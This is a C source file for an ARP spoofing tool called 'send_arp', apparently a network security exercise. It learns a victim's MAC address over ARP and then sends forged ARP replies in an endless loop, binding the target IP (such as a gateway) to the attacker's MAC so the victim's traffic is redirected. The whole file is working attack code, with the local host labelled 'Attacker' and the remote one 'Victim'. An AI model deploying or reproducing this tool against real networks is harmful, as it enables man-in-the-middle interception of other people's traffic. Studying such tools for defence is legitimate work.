#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <libnet.h>
#include <libnet/libnet-headers.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ether.h>

pcap_t* handle;

void print_MAC(u_int8_t* MAC){
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n", MAC[0], MAC[1], MAC[2], MAC[3], MAC[4], MAC[5]);
}
void print_ip(u_int8_t *Ip){
    printf("%u.%u.%u.%u\n", Ip[0], Ip[1], Ip[2], Ip[3]);
}
struct MACIP{
    u_int8_t sender_mac[6] = {0,};
    u_int8_t sender_ip[4] = {0,};
    u_int8_t target_mac[6] = {0,};
    u_int8_t target_ip[4] = {0,};
    u_int8_t att_mac[6] = {0,};
    u_int8_t att_ip[4] = {0,};
};
struct arp
{
    u_int16_t ar_hrd;         /* format of hardware address */
#define ARPHRD_NETROM   0   /* from KA9Q: NET/ROM pseudo */
#define ARPHRD_ETHER    1   /* Ethernet 10Mbps */
#define ARPHRD_EETHER   2   /* Experimental Ethernet */
#define ARPHRD_AX25     3   /* AX.25 Level 2 */
#define ARPHRD_PRONET   4   /* PROnet token ring */
#define ARPHRD_CHAOS    5   /* Chaosnet */
#define ARPHRD_IEEE802  6   /* IEEE 802.2 Ethernet/TR/TB */
#define ARPHRD_ARCNET   7   /* ARCnet */
#define ARPHRD_APPLETLK 8   /* APPLEtalk */
#define ARPHRD_LANSTAR  9   /* Lanstar */
#define ARPHRD_DLCI     15  /* Frame Relay DLCI */
#define ARPHRD_ATM      19  /* ATM */
#define ARPHRD_METRICOM 23  /* Metricom STRIP (new IANA id) */
#define ARPHRD_IPSEC    31  /* IPsec tunnel */
    u_int16_t ar_pro;         /* format of protocol address */
    u_int8_t  ar_hln;         /* length of hardware address */
    u_int8_t  ar_pln;         /* length of protocol addres */
    u_int16_t ar_op;          /* operation type */
#define ARPOP_REQUEST    1  /* req to resolve address */
#define ARPOP_REPLY      2  /* resp to previous request */
#define ARPOP_REVREQUEST 3  /* req protocol address given hardware */
#define ARPOP_REVREPLY   4  /* resp giving protocol address */
#define ARPOP_INVREQUEST 8  /* req to identify peer */
#define ARPOP_INVREPLY   9  /* resp identifying peer */
    /* address information allocated dynamically */
    u_int8_t ar_sender_mac[6];
    u_int8_t ar_sender_ip[4];
    u_int8_t ar_target_mac[6];
    u_int8_t ar_target_ip[4];
};
void chrtoIP(u_int8_t *IP, char *chr){
    char tmp[10];
    int cnt = -1;
    int idx = -1;

    for(int i=0; idx < 3; i++){
        if(!(chr[i] >= '0' && chr[i] <= '9')){
            IP[++idx] = (u_int8_t)atoi(tmp);
            cnt = -1;
            continue;
        }
        else {
            tmp[++cnt] = chr[i];
            tmp[cnt+1] = NULL;
        }
    }

    return;
}
void MakeREQUESTpacket(u_char *packet, MACIP *body ){
   arp *parp = (arp *)(packet+14);
   libnet_ethernet_hdr *pether = (libnet_ethernet_hdr *)packet;

   memcpy(pether->ether_dhost, "\xff\xff\xff\xff\xff\xff", 6);
   memcpy(pether->ether_shost, (body->att_mac), 6);
   pether->ether_type = htons(0x0806);
   parp->ar_hrd = htons(1);
   parp->ar_pro = htons(0x800);
   parp->ar_hln = 6;
   parp->ar_pln = 4;
   parp->ar_op = htons(ARPOP_REQUEST);
   memcpy(parp->ar_sender_mac, body->att_mac, 6);
   memcpy(parp->ar_sender_ip, body->att_ip, 4);
   memcpy(parp->ar_target_mac, body->sender_mac, 6);
   memcpy(parp->ar_target_ip, body->sender_ip, 4);

   return;
};
void MakeARPSpoofingpacket(u_char *packet, MACIP *body){
    arp *parp = (arp *)(packet+14);
    libnet_ethernet_hdr *pether = (libnet_ethernet_hdr *)packet;

    memcpy(pether->ether_dhost, body->sender_mac, 6);
    memcpy(pether->ether_shost, body->att_mac, 6);
    pether->ether_type = htons(0x0806);
    parp->ar_hrd = htons(1);
    parp->ar_pro = htons(0x800);
    parp->ar_hln = 6;
    parp->ar_pln = 4;
    parp->ar_op = htons(ARPOP_REPLY);
    memcpy(parp->ar_sender_mac, body->att_mac, 6);
    memcpy(parp->ar_sender_ip, body->target_ip, 4);
    memcpy(parp->ar_target_mac, body->sender_mac, 6);
    memcpy(parp->ar_target_ip, body->sender_ip, 4);

    return;
};
int GetattkIPAddress(u_int8_t *att_ip){
    struct ifreq ifr;
        char ipstr[40];
        int s;

        s = socket(AF_INET, SOCK_DGRAM, 0);
        strncpy(ifr.ifr_name, "ens33", IFNAMSIZ);

        if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
            printf("Error");
        } else {
            inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                    ipstr,sizeof(struct sockaddr));
            chrtoIP(att_ip, ipstr);
        }

        return 0;
}
int GetattkMacAddress(u_int8_t *att_mac)
{
 int nSD; // Socket descriptor
 struct ifreq *ifr; // Interface request
 struct ifconf ifc;
 int i, numif;

 memset(&ifc, 0, sizeof(ifc));
 ifc.ifc_ifcu.ifcu_req = NULL;
 ifc.ifc_len = 0;

 // Create a socket that we can use for all of our ioctls
 nSD = socket( PF_INET, SOCK_DGRAM, 0 );
 if ( nSD < 0 )  return 0;
 if(ioctl(nSD, SIOCGIFCONF, &ifc) < 0) return 0;
 if ((ifr = (ifreq*)  malloc(ifc.ifc_len)) == NULL)
 {
   return 0;
 }
 else
 {
  ifc.ifc_ifcu.ifcu_req = ifr;
  if (ioctl(nSD, SIOCGIFCONF, &ifc) < 0)
  {
   return 0;
  }
  numif = ifc.ifc_len / sizeof(struct ifreq);
  for (i = 0; i < numif; i++)
  {
   struct ifreq *r = &ifr[i];
   struct sockaddr_in *sin = (struct sockaddr_in *)&r->ifr_addr;
   if (!strcmp(r->ifr_name, "lo"))
    continue; // skip loopback interface

   if(ioctl(nSD, SIOCGIFHWADDR, r) < 0)
    return 0;

   for(int j = 0; j < 6; j++) att_mac[j] = (u_int8_t)(r->ifr_hwaddr.sa_data[j]);
   return 0;
  }

 }
 close(nSD);
 free(ifr);

 return( 1 );
};
int GetsendMacAddress(MACIP *body){
    u_char *packet = (u_char *)malloc(sizeof(libnet_ethernet_hdr)+sizeof(arp));
    MakeREQUESTpacket(packet, body);

    if (pcap_sendpacket (handle, packet, sizeof(libnet_ethernet_hdr)+sizeof(arp)) != 0)
       {
           fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
           return 1;
       }

    while (true) {
      struct pcap_pkthdr* header;
      const u_char* packet;
      int res = pcap_next_ex(handle, &header, &packet);
      struct libnet_ethernet_hdr *Ether;
      struct arp *ARP;

      if (res == 0) continue;
      if (res == -1 || res == -2) break;

      Ether = (struct libnet_ethernet_hdr *)packet;
      packet += 14;
      ARP = (struct arp *)packet;

      if(Ether->ether_type == 0x0608 && ARP->ar_op == 0x0200){
           memcpy(body->sender_mac, Ether->ether_shost, 6);
           return 0;
      }
    }

    return 0;
};
int ARPSpoofing(MACIP *body){
    u_char *packet = (u_char *)malloc(sizeof(libnet_ethernet_hdr)+sizeof(arp));


    while(1){
        MakeARPSpoofingpacket(packet, body);

        if (pcap_sendpacket (handle, packet, sizeof(libnet_ethernet_hdr)+sizeof(arp)) != 0)
           {
               fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
               return 1;
           }
    }

    return 1;
};
void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
   return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  MACIP body;
  u_char *msg;

  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  GetattkMacAddress(body.att_mac);
  printf("[*]  Attacker's MAC:        ");
  print_MAC(body.att_mac);
  GetattkIPAddress(body.att_ip);
  printf("[*]  Attacker's IP:         ");
  print_ip(body.att_ip);
  chrtoIP(body.sender_ip, argv[2]);
  chrtoIP(body.target_ip, argv[3]);
  GetsendMacAddress(&body);
  printf("[*]  Victim's MAC:          ");
  print_MAC(body.sender_mac);
  printf("Start ARP Spoofing!!!\n");
  ARPSpoofing(&body);

  pcap_close(handle);
  return 0;
}
